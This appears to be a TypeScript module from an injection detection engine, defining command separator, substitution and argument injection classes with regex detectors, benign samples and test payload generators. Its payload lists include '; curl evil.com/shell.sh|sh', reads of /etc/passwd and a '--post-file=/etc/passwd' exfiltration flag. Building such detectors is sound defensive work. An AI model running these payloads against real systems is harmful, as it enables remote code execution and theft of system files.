/**
 * Command Injection Invariant Classes — All 3
 */
import type { InvariantClassModule } from '../types.js'
import { deepDecode } from '../encoding.js'

export const cmdSeparator: InvariantClassModule = {
    id: 'cmd_separator',
    description: 'Shell command separators to chain arbitrary command execution',
    category: 'cmdi',
    severity: 'critical',
    calibration: { baseConfidence: 0.90, minInputLength: 3 },

    mitre: ['T1059.004'],
    cwe: 'CWE-78',

    knownPayloads: [
        '; id',
        '| cat /etc/passwd',
        '&& whoami',
        '|| uname -a',
        '`id`',
        '; curl evil.com/shell.sh|sh',
    ],

    knownBenign: [
        'hello world',
        'search for items',
        'price & value',
        'cats and dogs',
        'true || false in logic',
    ],

    detect: (input: string): boolean => {
        const d = deepDecode(input)
        return /[;&|`\n\r]\s*(?:cat|ls|id|whoami|pwd|uname|curl|wget|nc|ncat|bash|sh|zsh|python[23]?|perl|ruby|php|powershell|cmd|certutil|bitsadmin|net\s+user|reg\s+query|wmic)\b/i.test(d)
    },
    generateVariants: (count: number): string[] => {
        const seps = [';', '|', '&&', '||', '\n', '`', '$IFS']
        const cmds = ['id', 'whoami', 'cat /etc/passwd', 'ls -la', 'uname -a', 'curl evil.com/shell.sh|sh']
        const v: string[] = []
        for (let i = 0; i < count; i++) v.push(`${seps[i % seps.length]} ${cmds[i % cmds.length]}`)
        return v
    },
}

export const cmdSubstitution: InvariantClassModule = {
    id: 'cmd_substitution',
    description: 'Command substitution syntax to embed command output in another context',
    category: 'cmdi',
    severity: 'critical',
    calibration: { baseConfidence: 0.90 },

    mitre: ['T1059.004'],
    cwe: 'CWE-78',

    knownPayloads: [
        '$(id)',
        '$(cat /etc/passwd)',
        '`whoami`',
        '`curl evil.com/shell.sh`',
    ],

    knownBenign: [
        '$HOME directory',
        'cost is $(price)',
        'backtick `code` here',
        '$(document).ready()',
    ],

    detect: (input: string): boolean => {
        const d = deepDecode(input)
        return /\$\([^)]*(?:cat|ls|id|whoami|uname|curl|wget|bash|sh|python|perl|ruby|php|nc|ncat)[^)]*\)/i.test(d) ||
            /`[^`]*(?:cat|ls|id|whoami|uname|curl|wget|bash|sh)[^`]*`/i.test(d)
    },
    generateVariants: (count: number): string[] => {
        const v = [
            '$(id)', '$(cat /etc/passwd)', '`whoami`',
            '`curl evil.com/shell.sh`', '$(bash -c "id")',
            "$(python -c \"import os;os.system('id')\")",
        ]
        const r: string[] = []
        for (let i = 0; i < count; i++) r.push(v[i % v.length])
        return r
    },
}

export const cmdArgumentInjection: InvariantClassModule = {
    id: 'cmd_argument_injection',
    description: 'Inject arguments or flags into commands that accept user-controlled values',
    category: 'cmdi',
    severity: 'high',
    calibration: { baseConfidence: 0.78 },

    mitre: ['T1059.004'],
    cwe: 'CWE-88',

    knownPayloads: [
        '--output=/tmp/pwned',
        '-o /tmp/shell.php',
        '--exec=bash',
        '--post-file=/etc/passwd',
    ],

    knownBenign: [
        '--help',
        '-v',
        '--version',
        'my-file-name.txt',
        'normal argument',
    ],

    detect: (input: string): boolean => {
        const d = deepDecode(input)
        return /(?:^|\s)--(?:output|exec|post-file|upload-file|config|shell)\b/i.test(d) ||
            /(?:^|\s)-[oe]\s+(?:\/|http)/i.test(d)
    },
    generateVariants: (count: number): string[] => {
        const v = ['--output=/tmp/pwned', '-o /tmp/shell.php', '--exec=bash', '--post-file=/etc/passwd']
        const r: string[] = []
        for (let i = 0; i < count; i++) r.push(v[i % v.length])
        return r
    },
}

export const CMD_CLASSES: InvariantClassModule[] = [cmdSeparator, cmdSubstitution, cmdArgumentInjection]
